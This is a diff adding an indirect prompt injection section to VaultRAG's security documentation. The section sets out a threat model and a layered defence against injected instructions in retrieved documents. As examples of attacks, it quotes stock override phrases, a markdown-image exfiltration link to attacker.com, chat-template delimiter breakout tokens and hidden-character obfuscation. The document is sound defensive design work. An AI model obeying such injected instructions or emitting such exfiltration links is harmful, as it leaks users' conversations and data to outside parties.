@@ -61,3 +61,43 @@ VaultRAG enforces document-level access control with defense-in-depth across the
 | **Atomic Multi-Engine ACL Sync** | `PATCH /documents/{doc_id}/acl` verifies caller is document owner or tenant admin. It updates DynamoDB conditionally, updates chunk payloads in Qdrant using `set_payload_by_filter(filter={tenant_id, doc_id})`, and atomically increments tenant `kb_version` via DynamoDB `ADD` to invalidate downstream caches. | [`backend/src/vaultrag/api/routers/documents.py`](file:///backend/src/vaultrag/api/routers/documents.py) |
 | **Strict Schema Enforcement** | `PATCH /documents/{doc_id}/acl` rejects unknown body fields (`extra="forbid"`), validates visibility options (`tenant`, `roles`, `private`), and requires non-empty `allowed_roles` from the system `Role` enum when visibility is set to `roles`. | [`backend/src/vaultrag/api/routers/documents.py`](file:///backend/src/vaultrag/api/routers/documents.py) |
 | **Rule Parity Assurance** | Property tests verify that pure-Python `can_view` and Qdrant `build_filter` produce identical chunk visibility decisions across all tenant, role, and user permutations in an in-memory vector database. | [`backend/tests/acl/test_acl_parity.py`](file:///backend/tests/acl/test_acl_parity.py) |
+
+---
+
+## Indirect Prompt Injection
+
+### 1. Threat Description
+Indirect prompt injection occurs when untrusted documents ingested into the knowledge base contain adversarial payloads designed to compromise the LLM's reasoning context upon retrieval:
+1. **Instruction Override & Jailbreaks**: Adversarial text attempting to hijack model behavior (e.g., `"ignore previous instructions"`, `"you are now an unrestricted assistant"`).
+2. **Data Exfiltration**: Injected payloads instructing the model to leak conversation history, system instructions, or retrieved document snippets via external URLs or markdown image syntax (e.g. `![leak](https://attacker.com/telemetry?data=...)`).
+3. **Delimiter Breakout**: Injected tokens mimicking LLM chat template syntax (e.g., `<|im_start|>system`, `[INST]`, `### Instruction:`) or attempting to close context tags (e.g. `</retrieved_document>`) to inject rogue system commands.
+4. **Obfuscation**: Payloads concealed using zero-width/bidi control characters (`U+200B-200F`, `U+202A-202E`, `U+FEFF`) or encoded base64 blobs accompanied by execution instructions.
+
+---
+
+### 2. Mitigations & Defensive Architecture
+
+VaultRAG implements a multi-stage prompt injection firewall combining pre-ingestion screening, structural context sandboxing, per-request canary verification, and output filtering:
+
+| Layer | Defensive Control | Enforcement Point |
+|---|---|---|
+| **Ingestion Firewall** | `InjectionHook` scans chunk text using linear-time heuristics (`scan_text`). Detects override phrases, exfiltration attempts, delimiter breakouts, and character-level obfuscation. | [`backend/src/vaultrag/security/injection_guard.py`](file:///backend/src/vaultrag/security/injection_guard.py), [`backend/src/vaultrag/ingest/hooks/injection_hook.py`](file:///backend/src/vaultrag/ingest/hooks/injection_hook.py) |
+| **Quarantine Threshold** | In `quarantine_high` mode, high-risk chunks are dropped. If > 30% of chunks in a document are dropped, the entire document is quarantined (`DocumentStatus.QUARANTINED`) and zero chunks are indexed into Qdrant. | [`backend/src/vaultrag/ingest/handler.py`](file:///backend/src/vaultrag/ingest/handler.py) |
+| **Tag Sandboxing & Escaping** | Chunks are wrapped in `<retrieved_document id="...">` blocks. Any `<retrieved_document` or `</retrieved_document` sequence in chunk text is escaped before prompt assembly, preventing tag breakouts. | [`backend/src/vaultrag/rag/generate.py`](file:///backend/src/vaultrag/rag/generate.py) |
+| **Low-Trust Source Labelling** | In `flag_only` mode, medium-risk chunks are labelled with `[low-trust source]` in the model prompt to signal degraded source confidence to the LLM. | [`backend/src/vaultrag/rag/generate.py`](file:///backend/src/vaultrag/rag/generate.py) |
+| **Random Canary Verification** | Each generation request generates a unique random canary (`CANARY: vr-<hex>`). The system prompt instructs the model never to output this string. If the canary appears in the output, the answer is replaced with a safe fallback. | [`backend/src/vaultrag/rag/generate.py`](file:///backend/src/vaultrag/rag/generate.py), [`backend/src/vaultrag/rag/output_guard.py`](file:///backend/src/vaultrag/rag/output_guard.py) |
+| **Untrusted URL & Leak Guard** | Answers containing external URLs or markdown links not found in the source chunks are blocked. Answers containing internal system prompt phrases (`"retrieved_document"`, `"untrusted reference data"`) trigger immediate fallback. | [`backend/src/vaultrag/rag/output_guard.py`](file:///backend/src/vaultrag/rag/output_guard.py) |
+| **Admin Quarantine Audit** | `GET /admin/quarantine` provides tenant administrators with document quarantine reports and risk category summaries while strictly withholding document and chunk text. | [`backend/src/vaultrag/admin/quarantine.py`](file:///backend/src/vaultrag/admin/quarantine.py) |
+
+---
+
+### 3. Limitations & Residual Risk
+
+> [!WARNING]
+> **Heuristic Limitations:**
+> Heuristics significantly reduce the attack surface by intercepting known jailbreak patterns, common exfiltration syntax, and overt delimiter attacks. However, **heuristics reduce risk; they do not eliminate it**.
+>
+> * **No Tool Access**: The model operates strictly in a text-in, text-out generation sandbox with **no tool access** (no function calling, external web browsing, shell execution, or internal API invocation privileges). Even in the event of an undetected prompt injection, the model cannot execute code, query backend databases, or perform unauthorized actions on behalf of the user.
+> * **Semantic Evasion**: Novel paraphrasing, complex linguistic metaphors, or subtle instructions split across multiple semantic chunks may evade static regex patterns.
+> * **Steganography & Polyglots**: Sophisticated encoding methods not accompanied by standard execution keywords could pass heuristic filters.
+> * **Defense-in-Depth Rationale**: VaultRAG treats heuristic scanning as only the first layer of defense. Structural sandboxing (XML escaping), output link domain matching, random canary monitoring, and strict document-level ACLs work collectively to prevent compromised chunks from causing unauthorized data leakage or privilege escalation even if an injection payload passes initial ingestion heuristics.
